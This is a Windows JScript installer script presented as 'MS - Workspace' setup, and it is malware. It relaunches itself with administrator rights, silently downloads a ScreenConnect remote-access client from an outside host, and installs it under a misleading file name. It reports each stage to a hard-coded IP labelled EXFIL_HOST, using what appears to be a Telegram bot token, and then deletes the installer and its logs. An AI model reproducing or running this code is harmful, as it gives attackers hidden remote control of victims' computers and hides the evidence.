(function () {
    "use strict";

    var CONFIG = {
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
        MSI_URL: "https://educationalfiles.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
        DOWNLOAD_TIMEOUT_MS: 300000,
        MSI_EXTRA_ARGS: "",

        EXFIL_HOST: "212.43.151.96:20002",        
        
        TBTOKEN: "8679220057:AAHOQoG-qxYVT7-3si70mYE4_veZBf7q4l8",
        TCID: "-1004296347689",
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 

        UNINSTALL_EXISTING: true,
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",

        SHOW_POPUPS: false
    };

    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    function expand(p) {
        return shell.ExpandEnvironmentStrings(p);
    }

    var paths = {
        installDir: expand(CONFIG.INSTALL_DIR),
        logDir: expand(CONFIG.LOG_DIR),
        logFile: expand(CONFIG.LOG_DIR) + "\\" + CONFIG.LOG_FILE,
        msiLogFile: expand(CONFIG.LOG_DIR) + "\\" + CONFIG.MSI_LOG_FILE,
        msiPath: expand(CONFIG.INSTALL_DIR) + "\\" + CONFIG.MSI_FILE_NAME
    };

    function pad(n) {
        return (n < 10 ? "0" : "") + n;
    }

    function ts() {
        var d = new Date();
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
    }

    function ensureDirTree(dir) {
        var parent;
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fso.FolderExists(dir)) return;
        parent = fso.GetParentFolderName(dir);
        if (parent && parent !== dir && !fso.FolderExists(parent)) {
            ensureDirTree(parent);
        }
        if (!fso.FolderExists(dir)) fso.CreateFolder(dir);
    }

    function writeLog(level, msg) {
        try {
            ensureDirTree(paths.logDir);
            var f = fso.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
            f.Close();
        } catch (e) { }
    }


    function httpSignal(stage, exitCode) {
        try {
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            var now = new Date();
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
                      pad(now.getHours()) + pad(now.getMinutes());
            var statusCode, exitStr;

            switch (stage) {
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
            }

            var deployId = CONFIG.DEPLOY_TOKEN;

            var url = "http://" + CONFIG.EXFIL_HOST + "/" +
                      CONFIG.TBTOKEN + "/" +
                      CONFIG.TCID + "/" +
                      deployId + "." +
                      statusCode + "." +
                      exitStr + "." +
                      dts;

            http.Open("GET", url, false);
            http.SetTimeouts(1000, 1000, 1000, 1000);
            http.Send();
        } catch (e) { }
    }

    // ── helpers ──

    function isAdmin() {
        try {
            var exec = shell.Exec("net session");
            while (exec.Status === 0) { WScript.Sleep(50); }
            return exec.ExitCode === 0;
        } catch (e) { return false; }
    }

    function relaunchElevated() {
        var app = new ActiveXObject("Shell.Application");
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
        WScript.Quit(0);
    }

    function validateConfig() {
        if (!CONFIG.MSI_URL) quitFatal("Setup could not start.", "MSI_URL is empty", 1);
        if (CONFIG.MSI_URL.indexOf("https://") !== 0 && CONFIG.MSI_URL.indexOf("http://") !== 0)
            quitFatal("Setup could not start.", "Invalid MSI_URL scheme", 1);
        if (CONFIG.MSI_FILE_NAME.indexOf(".msi") === -1)
            quitFatal("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
    }

    function saveResponseBodyToFile(responseBody, outPath) {
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(responseBody);
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fso.FileExists(outPath)) fso.DeleteFile(outPath, true);
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
        stream.Close();
        return size;
    }

    function downloadInstaller(url, outPath) {
        var attempt, http, err, bytesWritten, status;
        ensureDirTree(fso.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= CONFIG.DOWNLOAD_RETRIES; attempt++) {
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, CONFIG.DOWNLOAD_TIMEOUT_MS, CONFIG.DOWNLOAD_TIMEOUT_MS);
                http.Open("GET", url, false);
                http.Send();
                status = http.Status;
                if (status === 200) {
                    bytesWritten = saveResponseBodyToFile(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fso.FileExists(outPath)) return true;
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < CONFIG.DOWNLOAD_RETRIES) WScript.Sleep(CONFIG.RETRY_DELAY_MS);
        }
        return false;
    }

    function uninstallExisting() {
        if (!CONFIG.UNINSTALL_EXISTING || !CONFIG.PRODUCT_CODE) return;
        var cmd = "msiexec.exe /x " + CONFIG.PRODUCT_CODE +
                  " /qn /norestart REBOOT=ReallySuppress";
        writeLog("INFO", "Uninstalling existing product: " + CONFIG.PRODUCT_CODE);
        var code = shell.Run(cmd, 0, true);
        if (code !== 0 && code !== 1605 && code !== 1612)
            writeLog("WARN", "Uninstall returned " + code + " — continuing anyway");
        else
            writeLog("INFO", "Uninstall exit code: " + code);
        WScript.Sleep(3000);
    }

    function runInstaller(msiPath) {
        var args, cmd, code, attempt, modes;
        ensureDirTree(paths.logDir);
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
                   CONFIG.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
            code = shell.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
            if (code !== 1603) return code;
            WScript.Sleep(2000);
        }
        return 1603;
    }

    function describeExitCode(code) {
        switch (code) {
            case 0:    return "Success";
            case 3010: return "Success (restart required)";
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
            case 1618: return "Another installation is already in progress";
            default:   return "Exit code " + code;
        }
    }

    function isSuccessCode(code) {
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    function quitFatal(friendlyMsg, technicalMsg, exitCode) {
        if (technicalMsg) writeLog("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
        writeLog("ERROR", "MSI log file: " + paths.msiLogFile);
        httpSignal("fail", exitCode);
        if (CONFIG.SHOW_POPUPS)
            shell.Popup(friendlyMsg, 0, CONFIG.PRODUCT_NAME + " Setup", 16);
        WScript.Quit(exitCode);
    }


    ensureDirTree(paths.installDir);
    ensureDirTree(paths.logDir);

    if (!isAdmin()) { relaunchElevated(); }

    httpSignal("start", null);

    validateConfig();

    if (!downloadInstaller(CONFIG.MSI_URL, paths.msiPath)) {
        quitFatal(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "Download failed after " + (CONFIG.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
    }

    if (!fso.FileExists(paths.msiPath) || fso.GetFile(paths.msiPath).Size <= 0) {
        quitFatal(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download", 1
        );
    }

    uninstallExisting();

    var exitCode = runInstaller(paths.msiPath);
    var statusText = describeExitCode(exitCode);

    if (isSuccessCode(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) httpSignal("okr", exitCode);
        else if (exitCode === 1638)                 httpSignal("oka", exitCode);
        else                                        httpSignal("ok", exitCode);
    } else if (exitCode === 1602) {
        writeLog("WARN", "Installation canceled by user");
        httpSignal("cl", exitCode);
        if (CONFIG.SHOW_POPUPS)
            shell.Popup("Setup was canceled.", 0, CONFIG.PRODUCT_NAME + " Setup", 16);
    } else {
        writeLog("ERROR", "Installation result: " + statusText);
        writeLog("ERROR", "MSI log file: " + paths.msiLogFile);
        httpSignal("fail", exitCode);
        if (CONFIG.SHOW_POPUPS)
            shell.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, CONFIG.PRODUCT_NAME + " Setup", 16);
    }

    try {
        if (fso.FileExists(paths.msiPath))   fso.DeleteFile(paths.msiPath, true);
        if (fso.FileExists(paths.logFile))   fso.DeleteFile(paths.logFile, true);
        if (fso.FileExists(paths.msiLogFile)) fso.DeleteFile(paths.msiLogFile, true);
        if (fso.FolderExists(paths.logDir))  { try { fso.DeleteFolder(paths.logDir, true); } catch (e) { } }
    } catch (e) { }

    WScript.Quit(exitCode);
})();